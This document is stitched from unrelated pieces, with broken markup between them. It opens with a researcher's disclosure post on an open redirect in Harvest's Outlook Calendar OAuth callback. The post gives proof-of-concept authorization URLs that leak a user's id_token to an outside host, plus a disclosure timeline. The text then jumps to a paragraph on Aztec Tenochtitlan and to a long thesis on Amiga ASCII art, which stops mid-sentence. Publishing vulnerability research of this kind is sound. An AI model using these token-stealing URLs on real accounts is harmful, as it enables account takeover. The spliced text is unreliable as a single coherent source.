  <h2 id="summary">Summary</h2>
<p>Harvest is a time-tracking software that allows users to connect their Outlook Calendar through OAuth. After a successful grant of permission, the user is redirected to <a href="https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback">https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback</a> which further redirects the user to the URL provided within the state. This leads to an open redirect which can be used to steal access tokens through an implicit grant.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The bare open redirect which led to the token leak was found after a successful connection to Outlook calendar using OAuth application located at <a href="https://hackerone295.harvestapp.com/outlook-calendar/connect">https://hackerone295.harvestapp.com/outlook-calendar/connect</a>. The link was:</p>
<pre><code><span>https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback?state=%7b%22return_to%22:%22/%22%2c%22subdomain%22:%22hackerone295%22%7d
</span></code></pre>
<p><code>state</code> parameter in the above URL is a JSON object URI encoded:</p>
<pre data-lang="json"><code data-lang="json"><span>{"</span><span>return_to</span><span>":"</span><span>/</span><span>","</span><span>subdomain</span><span>":"</span><span>hackerone295</span><span>"}
</span></code></pre>
<p>The subdomain parameter is used to guess the main space of the Harvest app ie. <a href="http://hackerone295.harvestapp.com/">hackerone295.harvestapp.com</a> in the above case. Appending a forward slash to the <code>subdomain</code> parameter leads to open redirect:</p>
<pre><code><span>https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback?state=%7b%22return_to%22:%22/%22%2c%22subdomain%22:%22example.com/%22%7d
</span></code></pre>
<p>Since the url <a href="https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback">https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback</a> is set as a redirection URL within the OAuth application, the open redirection can be used to steal the access token.</p>
<p>Combining the open redirect with implicit grant flow leaks the access tokens to the redirected URL. Implicit grant flow can be crafted as follows:</p>
<pre><code><span>https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
</span><span>client_id=0dcef4db-36d8-4aed-9cc5-ab43e1814884&amp;response_type=id_token
</span><span>&amp;redirect_uri=https%3A%2F%2Foutlook-integration.harvestapp.com%2Fauth%2Foutlook-calendar%2Fcallback?state=%7b%22return_to%22:%22/time%22%2c%22subdomain%22:%22localhost/%22%7d
</span><span>&amp;scope=openid
</span><span>&amp;response_mode=fragment
</span><span>&amp;state=1
</span><span>&amp;nonce=123456
</span></code></pre>
<p>The <code>redirect_uri</code> in the above link is the open redirect link. The <code>client_id</code> is the id of OAuth Application accessible via <a href="https://hackerone295.harvestapp.com/outlook-calendar/connect">https://hackerone295.harvestapp.com/outlook-calendar/connect</a></p>
<p>POC URL: <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=0dcef4db-36d8-4aed-9cc5-ab43e1814884&amp;response_type=id_token&amp;redirect_uri=https%3A%2F%2Foutlook-integration.harvestapp.com%2Fauth%2Foutlook-calendar%2Fcallback?state=%7b%22return_to%22:%22/time%22%2c%22subdomain%22:%22example.com/%22%7d&amp;scope=openid&amp;response_mode=fragment&amp;state=1&amp;nonce=123456">https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=0dcef4db-36d8-4aed-9cc5-ab43e1814884&amp;response_type=id_token&amp;redirect_uri=https%3A%2F%2Foutlook-integration.harvestapp.com%2Fauth%2Foutlook-calendar%2Fcallback?state=%7b%22return_to%22:%22/time%22%2c%22subdomain%22:%22example.com/%22%7d&amp;scope=openid&amp;response_mode=fragment&amp;state=1&amp;nonce=123456</a></p>
<p>The user is redirected to:</p>
<pre><code><span>https://example.com/.harvestapp.com/auth/outlook-calendar/callback?state=%7B%22return_to%22%3A%22%2Ftime%22%2C%22subdomain%22%3A%22example.com%2F%22%7D#id_token=[your access token]&amp;state=1

<h2 id="disclosure-timeline">Disclosure timeline</h2>
<p>In the process of disclosing and patching this vulnerability, the Harvest team was barely responsive. The company acknowledged the vulnerability by triaging but took a very long time to fix the vulnerability. After 3 years of reporting, the company finally fixed the vulnerability silently and didn't bother to inform. On 1st August 2023, I tested the vulnerability again and found it fixed. The report is still marked as triage as of 21 October 2023, and their bug bounty policy mentions rewards but no bounty or even HackerOne points were rewarded by the company. According to their HackerOne page, their average time to triage was 8 days (in 2020) but now it is nil. Hence, finally disclosing this publicly.</p>
<ul>
<li>Aug 23rd, 2020 - Reported vulnerability</li>
<li>Oct 16th, 2020 - First contact by Harvest</li>
<li>Nov 27th, 2020 - The report was triaged</li>
<li>Apr 28th, 2022 - The company said they are in the process of fixing it and gave an ETA of 2 weeks but it took them another year to fix it.</li>
<li>Aug 1st, 2023 - The vulnerability was confirmed as patched.</li>
<li>Oct 21st, 2023 - Publicly disclosed the report via this blog post.</li>

            The year is 1518. Mexico-Tenochtitlan, once an unassuming settlement in the middle of Lake Texcoco, now a bustling metropolis. It is the capital of an empire ruling over, and receiving tribute from, more than 5 million people. Tenochtitlan is home to 200.000 farmers, artisans, merchants, soldiers, priests and aristocrats. At this time, it is one of the largest cities in the world.</p><p>Today, we call this city Ciudad de Mexico - Mexico City.</p><p>Not much is left of the old Aztec - or <i>Mexica</i> - capital Tenochtitlan. What did this city, raised from the lake bed by hand, look like? Using historical and archeological sources, and the expertise of many, I have tried to faithfully bring this iconic city to life.

<div id="readability-page-1" class="page"><div><h2 id="summary">Summary</h2><p>In my thesis, I study Amiga ASCII text art. Amiga ASCII is a form of text art where the composition of letter characters set in the Amiga computer's font forms a two-dimensional representation or image. The Amiga scene is a subculture of computer enthusiasts that was popular in the 1990s. At its core are the logos and other visual materials created for BBS systems and the competitive rivalry among artists who create text art over their image-making prowess.</p><p>I delve into the creation of Amiga ASCII art and use it as a method to develop my visual expression. I define text art as one style of visual art, which includes ASCII art and its sub-genres, and I briefly describe the history of text art and ASCII art and the subculture associated with it.

By combining these three symbols in sequence, you get :-). When you tilt this combination ninety degrees clockwise in your mind, it can be interpreted as a smiling face, an emoticon, with eyes, nose, and mouth. Originally, these symbols were created for the structures of written language, but in daily human communication, these symbols and their combinations have been given a new added meaning and purpose. Images created with letter characters enhance the expressiveness of text-based presentations, such as emails or text messages.</p><p>In text-based communication, the representation of images has not always been possible for technical reasons. To address this need, text art emerged, a technique of creating images where a picture or word is formed from drawn or printed symbols in a composition. An emoticon is a kind of simple image formed with letter characters. However, by combining various letter characters spread over several lines, it's possible to create much more nuanced images that can depict almost any subject. This image-making technique has been a part of the history of writing up to the present day. I will discuss this matter in more detail in section <a href="#222-history-of-text-art">2.2.2.</a></p><p>Text art made on a computer is usually called ASCII art. The name derives from the character standard developed in the 1960s. ASCII art flourished in the 1980s and 1990s, before the internet, when text-based BBS systems operating on telephone networks served as the primary places for thought and information exchange, much like the internet. The making of ASCII art waned as the internet displaced BBS systems with the advent of fast broadband connections around the year 2000. However, ASCII art has surged in recent years due to nostalgia, social media, and the archiving of ASCII art.</p><p>In my thesis, I delve into this image-making technique and use it as a method to develop my visual expression. In the research sections, I define text art as one genre of visual art, encompassing ASCII art and its sub-genres, and briefly describe the history of text art and ASCII art and the associated subculture. I focus especially on the Amiga-style ASCII text art in my thesis and create a collection of my experiments using this image-making method. I elaborate on the aforementioned concepts in section <a href="#23-the-era-of-ascii-art">2.3</a>.</p><hr><h2 id="research-section">RESEARCH SECTION</h2><h2 id="21-source-materials-and-research-data">2.1. SOURCE MATERIALS AND RESEARCH DATA</h2><p>Historically, the typewriter as a medium of creative expression has largely been overlooked, perhaps because those who created typewriter art were primarily professional typists who demonstrated their skills mainly to peers in the same field. Many early typewriter artists were likely unaware of the historical background and significance of their art, leading to a lack of its widespread recognition and acceptance by critics. Those who were interested in the typewriter as a medium for text art were mainly intrigued by it from the perspective of concrete poetry, rather than viewing it from a visual art perspective. This has resulted in a lack of complete understanding of the entire field of text art. Only now, due to the archiving capabilities of the Internet and the exposure of text art, is a more comprehensive picture emerging.<sup><a href="#fn1" id="fnref1">[1]</a></sup></p><p>This same trend seems to be occurring with ASCII text art, leading to a perceived lack of quality source material on text art or ASCII art. Two anthologies have been written on typewriter art: Alan Riddell's <em>Typewriter Art</em> (1975) and Barrie Tullett's <em>Typewriter Art: A Modern Anthology</em> (2014). Only one significant retrospective has been held on typewriter art (London and Edinburgh 1973, 1974)<sup><a href="#fn2" id="fnref2">[2]</a></sup>. Not a single extensive publication or study has been written on ASCII art, and only one small exhibition was held in Cologne in 2013 as part of an electronic art festival. The subject has been briefly touched upon in a few studies dealing with computer enthusiast subcultures, such as the 2011 study <em>Like City Lights, Receding: ANSi Artwork and the Digital Underground, 1985-2000</em> by Canadian Michael Hargadon. Most studies focus on computer enthusiast subcultures and related phenomena mainly from a technical, sociological, or historical perspective.</p><p>For my research, I interviewed two individuals who are still actively involved in the Amiga ASCII scene. I interviewed Amiga ASCII pioneer, German Michael "Skin" Hischer, via email. Additionally, I interviewed Finnish Amiga ASCII artist Antti "h7" Kiuru. The interviews mainly focused on questions about the process of creating ASCII art, their style, sources of inspiration, and personal history. I also posed a few general questions in the Facebook group "Ansi, Ascii artists worldwide!" which includes a large portion of individuals involved in the subculture.</p><p>As written sources, I utilized several studies dealing with computer enthusiast subcultures and related phenomena, numerous internet sources, and Barrie Tullett's work on typewriter art, <em>Typewriter Art: A Modern Anthology</em>. From these pieces, I believe I was able to create a comprehensive yet source-critical understanding and description of the subject matter under investigation.</p><h2 id="22-about-text-art">2.2. ABOUT TEXT ART</h2><h3 id="221-definition-of-text-art">2.2.1. DEFINITION OF TEXT ART</h3><p>While working on this thesis, there didn't seem to be a definition of text art available anywhere. This is probably due to the almost complete absence of both Finnish and English literature or research on text art. Just the fact that the English Wikipedia article for "text art"<sup><a href="#fn3" id="fnref3">[3]</a></sup> redirects to a vague and sparse article on ASCII art indicates the scarcity of research and that the history of text art has not been fully understood internationally. However, to address my research topic, I need to define text art in some way.</p><p>When I started to develop a definition of text art, the difference in the use of a letter character in written language and in text art seemed to be a defining factor. What is the significance of a letter in text art? What's the difference between a letter character in written language and in text art?</p><p>Text is a semantic unit. In text, the form isn't as important as the meaning given by the forms<sup><a href="#fn4" id="fnref4">[4]</a></sup>. Written text consists of graphemes, i.e., written characters. Grapheme refers to letters, that is, characters used in a phonetic writing system, and other writable characters such as numbers and punctuation marks<sup><a href="#fn5" id="fnref5">[5]</a></sup>. In written language, text and letters contain meanings; they are a tool for communication.</p><p>In the context of text art, a character is considered solely through its form. In text art, a letter is not symbolic and does not have semantic meaning, but the composition of letter characters creates an image, which in itself can symbolize something. The semantic meaning of the image arises from the form given by the composition of the letter characters, that is, what the image resembles, unlike in written language where combinations of letter characters, words, and sentences mean something, carry meaning. Thus, one can think that the word "ball" immediately brings to mind an object made of some material, while in the context of text art, a ball can be symbolized by, for example, the letter O, in which case just the shape of the letter can bring to mind an object made of material.</p><p>Text art can therefore be defined as follows: <strong>text art is a form of art in which a composition of letter characters forms a two-dimensional representation, that is, an image</strong>.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>This definition is not satisfactory.</p><p>First of all, there are forms of text art where characters can have be both: semantic (where the character is a part of a word) and non-semantic (where the same character is part of an typographical picture) meanings. This is quite common in shaped or visual poetry.</p><p>Secondly — where the attempt at a universal definition of text art gets really complicated — it's possible that the whole picture consists of no letters at all. An example is of course ANSI art, where the pictures usually consist of only block elements █, ▓, ▒, and ░.</p><p>A possible, more broad, but also more straightforward, definition of text art could be: <strong>pictorial images created from type elements</strong>. (I don't suggest that to be the definitive definition, because it doesn't quite capture the essence of more calligraphic forms of text art.)</p><p>Broadly, text art can be divided into 3 categories: calligraphic, mechanical and digital.</p><p>Calligraphic text is hand drawn, it includes but is not limited to these sub-genres: calligrammes, calligraphic pictures, zoomorphic calligraphy, various shaped or pattern poetry (carmina figurata, grid poem, imago poem, spatial line poem), micro-calligraphy (or microgrammy), some asemic writing and pictorial islamic calligraphy.</p><p>Mechanical text art is usually done with either letterpress or typewriter. That includes subgenres such as: type pictures / typipictures (US), art-printing, letter-pictures, pictorial typography, ruled paintings / picture, imagotipo/imagotipia (Venezuela), Koppermandaag prenten (The Netherlands), Bildsatz, Ornamententypensatz, Typensatz (Germany), Stigmatypie (Austria), stigmatypy (US), typometry / typometrie, typotecture and typewriter art (including concerte poetry and other visual poetry).</p><p>Digital text art includes various textmode art such as 7-bit and 8-bit ASCII art, PETSCII, ATASCII, PC-ASCII (filled ASCII), ANSI art, Amiga ASCII, Shift_JIS, Unicode art, Taiwanese ANSI and others. Non-textmode text art includes newer and more varied styles, but they are too numerous to include here. Check Carlsson's overview and Polyduck's <a href="https://polyducks.co.uk/pages/what-is-textmode/">What is Textmode?</a> for more.</p><p>(I should write a more comprehensive overview especially of the mechanical ones at some point...)</p></div><h2 id="222-history-of-text-art">2.2.2. HISTORY OF TEXT ART</h2><p>Before the invention of typewriters and computers, calligram was the most common form of text art. A calligram is a poem, phrase, or word in which the text or words are arranged so that they collectively form a picture. The picture formed in the calligram is usually visually related to the words or word used in it and expresses the theme of the poem. One of the first calligrams is <em>Axe</em> by Simmias of Rhodes, made in 325 BC, where the text forms an image of an axe (Figure 2). A Jewish tradition of micro-calligraphy also resembles calligrams, where small written Hebrew letters form geometric and abstract images<sup><a href="#fn6" id="fnref6">[6]</a></sup>.</p><figure><img alt="A manuscript page of 3 poems shaped like an axe, wings and a vase" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/XAbta85DYP-700.jpeg" width="700" height="396"><figcaption>(Figure 2.) Axe of Simmias of Rhodes, 325 BCE</figcaption></figure><p>Arabic calligraphy can also be considered a form of text art. Drawing humans is seen in Islam as idol worship, so picyutrd were drawn using calligraphy, that is, text. In Islamic culture, calligraphy is considered the noblest form of visual art, as it translates the words of God as revealed in the Qur'an into a visible form. Qur'anic manuscripts have always been commissioned from the most skilled calligraphers to give the text an artistic appearance worthy of its value <sup><a href="#fn7" id="fnref7">[7]</a></sup>.</p><p>Movable type and printing press developed in the 1400s made duplicating knowledge fast and, above all, cheap. The printing technique made it possible to shape people's perceptions of themselves and the surrounding world. The great revolution of printing in Europe was the invention of movable type, which meant that the same type could be used over and over again to produce many different printed products. Movable types significantly accelerated page production compared to engraving each page separately on wood or metal plates, so movable types were also used to create typographic ornaments and pictures <sup><a href="#fn8" id="fnref8">[8]</a></sup>.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>This is my current focus of study and I hope to write more about the history of pictorial typography with movable type soon™!</p></div><p>Just as the printing press once did, the typewriter revolutionized the world. By the end of the 1800s, it had established its position not only in the industrial and commercial sectors but also in the cultural and social fields. Typewriter created new professions and livelihoods and was also a crucial step towards women's emancipation. It also gave people the means to communicate freely without fear of censorship and enabled writers to write as quickly as they thought. The typewriter brought a modern way of directly presenting and disseminating thoughts<sup><a href="#fn9" id="fnref9">[9]</a></sup>. It also became a tool for making art.</p><figure><img alt="Typewritten drawing of a butterfly" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/sQHzWW2fiz-600.jpeg" width="600" height="901"><figcaption>(Figure 3.)

By re-entering the same paper at different angles and stacking letters, almost any shape could be created, and Stacey's picture is more reminiscent of pencil drawing than typical mosaic-like text art. On the other hand, a few years earlier, the publication <em>Pitman’s Typewriter Manual</em> (1893) better utilized the limitations and possibilities set by the typewriter and is more reminiscent of modern ASCII art than Stacey's butterfly (Figure 4).</p><figure><img alt="Various patterns, letters and characters made with a typewriter" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/xaTljLkg-F-590.jpeg" width="590" height="824"><figcaption>(Figure 4.) Pitman’s Typewriter Manual (1893)</figcaption></figure><p>However, text art made with a typewriter can be seen to have flourished mainly in the 50s–70s. Around the same time in the 1950s, concrete poetry was born in different parts of the world, where the typewriter was used as a tool to create visual poems with the typographic layout of words being crucial to the impression. In concrete poetry, seeing and reading play an equally significant role<sup><a href="#fn11" id="fnref11">[11]</a></sup>. Artists and poets who used this method were interested in how printed words can be interpreted through their presentation and design. They sought ways to create new meanings and conceptual levels for the text by visually composing it<sup><a href="#fn12" id="fnref12">[12]</a></sup>.</p><p>At the same time, written messages were transmitted over radio links using teletype machines. Using a sound reminiscent of Morse code, the machine could remotely control another similar teletype machine, with messages printed on paper through a printer. What was written on paper at one end was automatically written on paper at the other end. To standardize the character graphics for teletypes, the 5-bit Baudot code was developed, which can be considered a precursor to the ASCII character system. Text art created with teletype machines was exchanged among other radio amateurs, and these works are very reminiscent of future ASCII art <sup><a href="#fn13" id="fnref13">[13]</a></sup> (Figure 5).</p><figure><img alt="The last supper rendered with text" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/Nlo5l3x-sh-640.jpeg" width="640" height="479"><figcaption>(Figure 5.) Teletype art.</figcaption></figure><p>The development of different forms of text art does not seem to be linear but appears to have occurred independently following each paradigm shift in information technology. They are fascinating examples of how technology has been used as a tool to create works far from what the technology developers could have imagined they would create. The pioneers of text art seem to have been primarily those who were not primarily artistically oriented but were interested in technology and its limitations.</p><p>The first step in the emergence of computer-made text art, called ASCII art, occurred with the change in Western consumption paradigm brought about by the microcomputer revolution in the late 1970s. How did this paradigm shift occur, and what followed? What steps led to the birth of ASCII art? I will discuss these issues in the next chapter.</p><h2 id="23-the-age-of-ascii-art">2.3. THE AGE OF ASCII ART</h2><h3 id="231-a-history-of-home-computers">2.3.1. A HISTORY OF HOME COMPUTERS</h3><p>At its core, computers are intricate calculators, adept at computing mathematical functions swiftly and processing vast amounts of data. Until the late '70s, these calculations and data processing were performed on large mainframes – the first-generation computers situated in glass-walled computer rooms. These were primarily used as instruments of centralized power within hierarchical organizations to manage large and complex commercial-administrative systems. This gave birth to an industry where IBM played a dominant role. These mainframes were only accessible to entities with significant capital, such as the defense industry, large corporations, and universities. Their operation required expertise in both hardware and software<sup><a href="#fn14" id="fnref14">[14]</a></sup>.</p><p>By the late '70s, foundational computer components, transistors, and microprocessors, had been miniaturized enough to allow for the creation of reasonably sized second-generation microcomputers. In essence, microcomputers did not differ from mainframes except in size, price, availability, and complexity<sup><a href="#fn15" id="fnref15">[15]</a></sup>.</p><p>However, the technology revolution didn't stem merely from technological achievements, but from the evolution of factories that produced components. As these components were miniaturized, their production costs reduced, and manufacturing energy efficiency and volumes increased. This allowed for mass production of computers. Yet, by the mid-'70s, a typical microcomputer user needed skills like soldering components, constructing keyboards, interfacing devices, and programming both the system and applications. Computers transitioned from computer rooms to design offices and labs, inadvertently giving rise to the hacker culture. A new wave of enterprises emerged in the IT sector, leading innovations and developing consumer-friendly applications and devices<sup><a href="#fn16" id="fnref16">[16]</a></sup>.</p><p>By the late '70s, new companies emerged that sold pre-assembled computers. Apple was one of these, with its Apple II in 1977 being the first massively successful mass-produced microcomputer. In a May 1977 article for <em>Byte</em> magazine, Apple's Steve Wozniak wrote,</p><blockquote><p>“I think a personal computer should be small, reliable, convenient to use, and inexpensive”<sup><a href="#fn17" id="fnref17">[17]</a></sup>.</p></blockquote><p>No longer did computer users need to be IT experts or hobbyists, but could simply be the "ordinary consumer".</p><p>The third generation, or personal computers, in the 1980s, transitioned IT from the hands of engineers to a broader user base who began applying it for tasks like word processing and spreadsheet calculations. By the '80s, the market had been flooded by several small, medium, and large companies offering various solutions. By 1983, however, the market was predominantly dominated by systems from three computer manufacturers: Apple Computer's <em>Apple II</em>, Commodore International's <em>Commodore 64</em> (and later <em>Amiga</em>), and IBM's <em>PC</em>. Each catered to slightly different consumer bases based on price and technical features. Apple computers were mostly sold to users wanting a mix of games and utility programs, Commodore dominated the gaming market because of its affordability and superior graphics and sound capabilities, and IBM rapidly secured a monopoly in the corporate IT world.</p><p>In the 1980s competition, IBM established the dominant standard for personal computers (IBM PC-compatible computers), but lost its exclusive rights to manufacture machines following its standard. By the end of the '80s, 80% of all sold microcomputers were either IBM-made or at least used its system. However, by the early '90s, the mantle had shifted to the Intel-Microsoft duo, whose actions reshaped the entire industry. Intel was responsible for processors, and Microsoft took care of the operating system<sup><a href="#fn18" id="fnref18">[18]</a></sup>.</p><p>Still, Amigas were popular in the early '90s and became significant among computer enthusiasts. They were more prevalent in Europe than in America, which influenced the strong Amiga culture in Europe. For instance, according to a reader survey conducted by <em>MikroBitti</em> magazine, 49% of its Finnish readers owned an Amiga, while 27% owned a PC, at the turn of 1991–1992<sup><a href="#fn19" id="fnref19">[19]</a></sup>.</p><p>However, Amiga's share of the home computer market declined sharply in subsequent years as PCs overtook them in terms of price-to-quality ratio. Commodore couldn't counteract IBM PC's and its clones' rise with their Amiga. Though initially ahead in terms of value, by 1992, it became challenging to produce cost-competitive technology against the ballooning PC industry<sup><a href="#fn20" id="fnref20">[20]</a></sup>.</p><p>In May 1994, Commodore filed for voluntary bankruptcy. However, the unwavering loyalty of some Amiga users ensured that the Amiga hobby and scene continued, even if new devices were no longer sold. By the mid-'90s, PCs had become the standard home computer in Europe, with no serious challengers in sight.<sup><a href="#fn21" id="fnref21">[21]</a></sup> Gradually, computers became a household item in Western countries.</p><p>Brushes and parchment, the printing press, teletype, and typewriters each enriched text-based communication in their time. Similarly, the most crucial factor of the computer revolution was the democratization of information as the computer became a consumer product<sup><a href="#fn22" id="fnref22">[22]</a></sup>. In the following subsections, I will discuss the evolution of computer writing systems and the emergence of different forms of ASCII art with these devices and systems.</p><h3 id="232-what-is-ascii-art">2.3.2. WHAT IS ASCII ART?</h3><p>In the 1960s, to facilitate the transfer of text-form information across various systems and devices, the ASCII character set standard was developed (an acronym for <em>American Standard Code for Information Interchange</em>)<sup><a href="#fn23" id="fnref23">[23]</a></sup>. In information technology, a character set is an agreement defining how binary numbers represented as bit combinations should be interpreted as characters belonging to a writing system. A computer can correctly process only those characters included in its known character set. ASCII is a 7-bit character set, covering 128 (2⁷) character positions, and primarily encompasses the letters, numbers, punctuation, and special characters, as well as certain control codes, required for American English<sup><a href="#fn24" id="fnref24">[24]</a></sup>.</p><figure><img alt="A list of characters in ASCII" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/06J-fhZapl-1092.png" width="1092" height="270"><figcaption>(Figure 6.) Printable letters and symbols from the ASCII character set.</figcaption></figure><p>Since computers typically use 8-bit bytes and ASCII is 7-bit, many computer manufacturers developed broader character sets where the spare bit was utilized. This doubled the number of characters from 128 to 256 (2⁸). In these character sets, the first 128 characters typically matched ASCII, but the remaining positions could be devoted, for example, to letters of other languages or characters reserved for table graphics. As a result, the extended character sets of different computer manufacturers could vary considerably<sup><a href="#fn25" id="fnref25">[25]</a></sup>.</p><p>ASCII remained the most commonly used character set on the Internet until 2007 when it was overtaken by the UTF-8, based on the Unicode standard, comprising over 110,000 characters<sup><a href="#fn26" id="fnref26">[26]</a></sup>.</p><p>Artwork created with the ASCII character set is referred to as ASCII art. However, the term "ASCII art" has become an umbrella term for all types of images formed from computer-assisted characters. This is somewhat misleading, as ASCII refers to the original 7-bit, 128-character position character set. Most ASCII art, however, is crafted using extended 8-bit or higher character sets. The most renowned forms of ASCII art are 7-bit ASCII art, ANSI art, Amiga ASCII, ATASCII, PETSCII, Shift_JIS, teletext, and Unicode art. Each employs a distinct character set and often a specific font to craft the images<sup><a href="#fn27" id="fnref27">[27]</a></sup>.</p><p>Most ASCII art is crafted using a computer's text-based system (known as "textmode"), which consists of a grid built from identically sized cells. Each cell can contain one character. Characters employ a monospaced font, with each character occupying equal space, thus each row can contain an equal number of characters. The number of characters per row depends on the system and application in use. For instance, IBM PCs employed an 80x25 grid for displaying text, with a maximum of 25 rows, each having 80 cells. Current text processing predominantly supports variable-width fonts, which weren't viable in textmode. ASCII art made in textmode can thus be described as a kind of mosaic, where typographical symbols are precisely arranged on a grid to form an image<sup><a href="#fn28" id="fnref28">[28]</a></sup>.</p><p>One of the earliest images reminiscent of ASCII art was created by Kenneth Knowlton and Leon Harmon, both of whom worked at Bell Labs. The image was a mosaic of a nude, comprised of symbols used in electronic circuit diagrams<sup><a href="#fn29" id="fnref29">[29]</a></sup>: (Figure 7).</p><figure><img alt="A black and white image of reclaining nude body, comprised of symbols used in electronic circuit diagrams" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/hgult1_0qR-2000.jpeg" width="2000" height="853"><figcaption>(Figure 7.) Harmon-Knowlton nude.</figcaption></figure><blockquote><p>"The nonscientific, some say artistic, aspects of computer graphics arose for me via a sophomoric prank. Ed David, two levels up, was away for while and the mice, one might say, played ever more freely. Leon Harmon stopped by to ask me for help with a brilliant idea: when Ed returns, one entire wall of his office will be covered with a huge picture made of small electronic symbols for transistors, resistors and such. But overall, they will form a somewhat-hard-to-see picture of, guess what, a nude! And so the renowned Harmon-Knowlton nude was conceived, coaxed into being, and duly hung on Ed's wall."<sup><a href="#fn30" id="fnref30">[30]</a></sup>.</p></blockquote><p>Even though this image was swiftly removed from the office wall and rapidly dismissed by Bell Labs' PR department, it leaked to the public, ending up on the pages of The New York Times and even on display at the Museum of Modern Art in New York in an exhibition titled <em>The Machine as Seen at the End of the Mechanical Age</em>. This prank turned into a sensation in a short time, and the creation of this symbol-based mosaic was a crucial step in the evolution of computer graphics and ASCII art<sup><a href="#fn31" id="fnref31">[31]</a></sup>.</p><h3 id="233-what-is-amiga-ascii-art">2.3.3. WHAT IS AMIGA ASCII ART?</h3><p>ASCII art made with the Amiga computer's font and column settings is called Amiga ASCII.</p><p>The Amiga has its own 8-bit character set. The first 128 characters follow the ASCII standard, but the remaining 128 characters belong to Amiga's extended character set. It isn't particularly suited for drawing pictures and graphics, as it doesn't contain characters meant for drawing tables and graphics, unlike character sets of some other contemporary machines. Amiga's extended character set mainly contains some mathematical symbols and some characters of European languages, such as the letters ä, ö, and å used in Finnish.</p><figure><img alt="A list of characters in Amiga" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/WClLk5xu82-583.png" width="583" height="309"><figcaption>(Figure 6.) Printable letters and symbols from the Amiga character set.</figcaption></figure><p>What makes the Amiga particularly suitable for creating text art, however, is its default monospaced font "Topaz". Its letterforms and column settings allow for the creation of cohesive patterns. In Amiga, the line spacing and character spacing are very narrow, so certain characters "merge" if arranged correctly. For example, by typing an underscore followed immediately by a slash, it looks as if these two characters were one cohesive pattern and not two separate characters.</p><p>By combining these characters, it's possible to create pictures resembling sketches or outline drawings. This is a special feature of Amiga ASCII, distinguishing it from all other forms of ASCII art. Amiga ASCII is also called line-ASCII to differentiate it from filled-ASCII made on PCs.</p><p>Slashes and underscores are perhaps the most commonly used characters in Amiga ASCII art. These characters form the basis of many Amiga ASCII pictures. Two slashes placed one below the other form a cohesive slanting line, and two underscores in a row form a straight horizontal line. These characters can form an endless variety of shapes, which almost seamlessly connect to each other. Due to the cohesive line formed by the slash, many Amiga ASCII logos look italic or slanted.<sup><a href="#fn32" id="fnref32">[32]</a></sup></p><figure><img alt="The word foundation rendered in Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/O8X5M6sFju-397.png" width="397" height="115"><figcaption>(Figure 9.) Foundation - this word is formed using the Topaz font characters / \ and _ with Amiga's original column settings.</figcaption></figure><p>Michael Hischer, whom I interviewed, describes his technique as:</p><blockquote><p>"[The limited number of characters] has always been an opportunity and challenge for me to create something that others don't do or can't do. I never use more than ten characters when creating ASCII. An excessive number of characters would be a distraction and divert from the essentials." <sup><a href="#fn33" id="fnref33">[33]</a></sup> (Figure 10)</p></blockquote><figure><img alt="Various typographical symbols from the Amiga character set" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/-84UvNu9jk-485.png" width="485" height="34"><figcaption>(Figure 10.) Characters mainly used in the art of Michael "Skin" Hischer, a pioneer of Amiga ASCII art.</figcaption></figure><p>Amiga ASCII is part of a broader phenomenon called the demoscene. The demoscene is a computer hobbyist subculture centered around its cultural artifacts, demos. Demos are real-time audiovisual presentations executed on a computer, made especially within the demo culture, or demoscene, that emerged around the mid-1980s.<sup><a href="#fn34" id="fnref34">[34]</a></sup> The Amiga scene, on the other hand, is a subculture of the demoscene, centered on logos and other visual materials made for BBS usage and the competitive skill of text artists.<sup><a href="#fn35" id="fnref35">[35]</a></sup></p><p>Amiga ASCII art can be seen as a continuation of PETSCII art made on Commodore's earlier Commodore 64 computer. PETSCII refers to the character set of the Commodore 64, which was well-suited for text art. The technologically advanced Amiga, however, replaced the Commodore 64, and many PETSCII artists began to create text art on Amiga computers. However, the popularity of Amiga ASCII art is mainly based on the culture and social communities formed around BBS<sup><a href="#fn36" id="fnref36">[36]</a></sup>. For this reason, I will mainly focus on discussing Amiga ASCII during the BBS era, leaving out the similarities of PETSCII art to Amiga ASCII.</p><p>Nowdays Amiga ASCII is mostly created on PC, Mac or Linux computers. The only defining factor for Amiga ASCII art today seems to be the method of creating the image using the Amiga font.</p><h3 id="234-the-golden-age-of-amiga-ascii">2.3.4. THE GOLDEN AGE OF AMIGA ASCII</h3><p>A BBS (<em>Bulletin Board System</em>) refers to a computer connected to the landline network through a modem, to which its users, or BBS enthusiasts, connected with their own computer. The main focus of BBSs was primarily on various discussion areas and file sharing. Many BBSs formed tight-knit user communities and served as meeting places for various groups. BBSs can be thought of as precursors to many features familiar from today's Internet, such as social communities.<sup><a href="#fn37" id="fnref37">[37]</a></sup></p><p>The origin of BBSs began when Ward Christensen and Randy Suess (US) developed the MODEM program in 1978 mainly for data exchange within their computer club. With it, two computers could communicate and exchange files. Later that year, Christensen and Suess developed the system known as the world's first BBS called CBBS (<em>Computer Bulletin Board System</em>)<sup><a href="#fn38" id="fnref38">[38]</a></sup>.</p><figure><img alt="Amiga computer connected to a CRT showing a colorful BBS menu screen" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/-NVaxnysH8-640.jpeg" width="640" height="480"><figcaption>(Figure 11.) BBS rig on an Amiga 1200 computer.</figcaption></figure><p>Connections to the BBS were made using a modem connected to the landline network, using a character-based terminal program. Connecting cost the same as making a regular phone call. International connections were thus possible, though expensive. After calling the BBS, the user had to log into the system first. Most often, real names and sometimes also pseudonyms or handles were used in BBSs. In addition, during 